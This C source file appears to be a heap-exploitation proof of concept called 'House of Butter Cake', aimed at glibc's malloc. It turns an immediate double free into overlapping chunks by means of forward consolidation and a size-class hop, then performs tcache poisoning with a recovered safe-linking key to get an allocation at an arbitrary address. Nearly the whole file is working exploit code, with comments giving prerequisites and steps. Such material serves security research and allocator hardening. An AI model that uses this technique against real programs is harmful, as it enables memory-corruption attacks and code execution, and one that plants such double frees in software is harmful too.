#define _GNU_SOURCE

#include <assert.h>
#include <gnu/libc-version.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

/*
 * House of Butter Cake: a House of Botcake variant that bypasses strict
 * tcache double-free detection through forward consolidation and a size-class
 * hop.
 *
 * Prerequisites (the same basic primitives as House of Botcake):
 * - Allocation of a small range of attacker-chosen request sizes.
 * - A strict double-free sink and a normal-free sink.
 * - Normal write access to the returned allocation.
 * - A chunk-read primitive for the compact safe-linking path shown below.
 * - A libc leak.
 * - A glibc build with tcache enabled.
 *
 * The demonstrated safe-linking path does not require a separate heap-base
 * disclosure: it reads the encoded NULL through the allocated overlap.
 *
 * The vulnerability used below is exactly:
 *
 *     free(victim);
 *     free(victim);
 *
 * There is no write, allocation, or attacker action between the two frees.
 *
 * The first free cannot enter its full tcache bin.  It therefore reaches the
 * arena, forward-consolidates with an adjacent free chunk, and changes the
 * victim from chunk size 0x110 to 0x1a0.  The consolidated chunk is linked in
 * an arena bin, whose fd/bk pointers also replace the old tcache key.  That is
 * the unsorted bin through glibc 2.42 and a smallbin starting with glibc 2.43.
 *
 * The immediately repeated free now sees a different size class and no
 * matching tcache key.  It puts the 0x1a0 chunk in that tcache bin before the
 * arena checks can reject the duplicate.  The same physical chunk is now on
 * both a tcache list and an arena-bin list.
 *
 * This demonstration then claims the chunk through both lists to create an
 * overlap and uses that overlap for ordinary tcache poisoning.  Safe-linking
 * (glibc >= 2.32) does not stop the double-free bypass.  With the chunk-read
 * primitive, the overlap exposes an allocator-generated encoded NULL
 * (chunk_address >> 12), so the final poisoned next pointer can be encoded
 * without disclosing the full heap base.
 * On those later releases, the final tcache poisoning can also be performed
 * blindly by chaining House of Water with Safe-Link Double Protect.  That
 * route needs two stale malloc aliases and a four-bit retry oracle, but no
 * chunk-read primitive or heap-address disclosure.
 */

#define TCACHE_PROBE_LIMIT 32
#define PROBE_REQUEST 0x300
#define VICTIM_REQUEST 0x100
#define RIGHT_REQUEST 0x80
#define MERGED_REQUEST 0x190
#define TINY_REQUEST 0x10

/*
 * Volatile indirection keeps compiler builtin analysis from treating these as
 * direct free() calls.  This avoids -Wuse-after-free diagnostics and
 * optimizations based on the intentional double free's undefined behavior,
 * keeping both calls in the generated program.
 */
static void (*volatile call_free)(void *) = free;

/*
 * The default tcache capacity is 7 through glibc 2.42 and 16 starting with
 * glibc 2.43; probe it because tunables can change either value.
 */
static int
active_tcache_count(void)
{
    void *probe[TCACHE_PROBE_LIMIT + 1];
    void *guard[TCACHE_PROBE_LIMIT + 1];
    void *reclaimed[TCACHE_PROBE_LIMIT + 1];
    int count = -1;

    /*
     * Discover the active capacity instead of assuming 7 or 16.  A tcache
     * free leaves the following chunk's PREV_INUSE bit set; the first arena
     * free clears it.  Guards prevent the probes from consolidating.
     */
    for (int i = 0; i <= TCACHE_PROBE_LIMIT; i++) {
        probe[i] = malloc(PROBE_REQUEST);
        guard[i] = malloc(TINY_REQUEST);
        assert(probe[i] != NULL && guard[i] != NULL);
    }

    for (int i = 0; i <= TCACHE_PROBE_LIMIT; i++) {
        call_free(probe[i]);
        if ((((uintptr_t *) guard[i])[-1] & 1) == 0) {
            count = i;
            break;
        }
    }
    assert(count > 0 && count <= TCACHE_PROBE_LIMIT);

    /* Drain the probe tcache and reclaim the one arena-bin probe. */
    for (int i = 0; i <= count; i++) {
        reclaimed[i] = malloc(PROBE_REQUEST);
        assert(reclaimed[i] != NULL);
    }

    return count;
}

int
main(void)
{
    void *victim_fill[TCACHE_PROBE_LIMIT];
    void *right_fill[TCACHE_PROBE_LIMIT];
    uintptr_t target[4] __attribute__((aligned(16))) = {0};
    int tcache_count;

    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    printf("House of Butter Cake on glibc %s\n",
           gnu_get_libc_version());
    puts("Strict double free -> forward consolidation -> size-class hop\n");

    tcache_count = active_tcache_count();
    printf("Active tcache capacity: %d\n", tcache_count);

    for (int i = 0; i < tcache_count; i++)
        victim_fill[i] = malloc(VICTIM_REQUEST);
    for (int i = 0; i < tcache_count; i++)
        right_fill[i] = malloc(RIGHT_REQUEST);

    uintptr_t *victim = malloc(VICTIM_REQUEST); /* chunk size 0x110 */
    void *right = malloc(RIGHT_REQUEST);        /* chunk size 0x090 */
    void *guard = malloc(TINY_REQUEST);
    assert(victim != NULL && right != NULL && guard != NULL);

    for (int i = 0; i < tcache_count; i++)
        call_free(victim_fill[i]);
    for (int i = 0; i < tcache_count; i++)
        call_free(right_fill[i]);

    puts("1. Put victim's right neighbor in an arena bin (its tcache is full).");
    call_free(right);

    puts("2. First free: victim's tcache is full, so it forward-consolidates");
    puts("   with the right neighbor; its chunk size changes 0x110 -> 0x1a0.");
    call_free(victim);
    assert((victim[-1] & ~(uintptr_t) 0xf) == 0x1a0);

    /* Save the valid links before the second free overwrites them. */
    uintptr_t arena_fd = victim[0];
    uintptr_t arena_bk = victim[1];
    assert(arena_fd != 0 && arena_bk != 0);

    puts("3. Second free immediately follows.  The new 0x1a0 tcache bin is");
    puts("   empty, and arena-bin bk is not the tcache key: detection misses.");
    call_free(victim); /* vulnerability: strict, immediate double free */

    puts("4. Claim the 0x1a0 chunk from tcache while it remains arena-linked.");
    uintptr_t *claimed = malloc(MERGED_REQUEST);
    assert(claimed == victim);

    /* tcache_put/get damaged victim->fd/bk; restore the arena-bin links. */
    claimed[0] = arena_fd;
    claimed[1] = arena_bk;

    puts("5. Claim and split the same chunk through the arena, creating an");
    puts("   allocated 0x20 chunk overlapped by the 0x1a0 allocation.");
    uintptr_t *tiny1 = malloc(TINY_REQUEST);
    uintptr_t *tiny2 = malloc(TINY_REQUEST);
    assert(tiny1 == claimed);

    puts("6. Free tiny1 into an empty tcache and read its encoded NULL.");
    call_free(tiny1);
    uintptr_t safe_link_key = claimed[0];
    assert(malloc(TINY_REQUEST) == tiny1);

    puts("7. Rebuild a two-entry list and poison it with the recovered key.");
    call_free(tiny2);
    call_free(tiny1);
    /* Before safe-linking, the freed-list NULL word is zero. */
    claimed[0] = safe_link_key ^ (uintptr_t) target;

    assert(malloc(TINY_REQUEST) == tiny1);
    uintptr_t *result = malloc(TINY_REQUEST);

    printf("target = %p, malloc returned %p\n", (void *) target,
           (void *) result);
    assert(result == target);
    result[0] = 0x424c554542455252ULL; /* "BLUEBERR" marker */
    assert(target[0] == 0x424c554542455252ULL);

    puts("Success: the strict double-free bypass produced arbitrary allocation.");
    return 0;
}
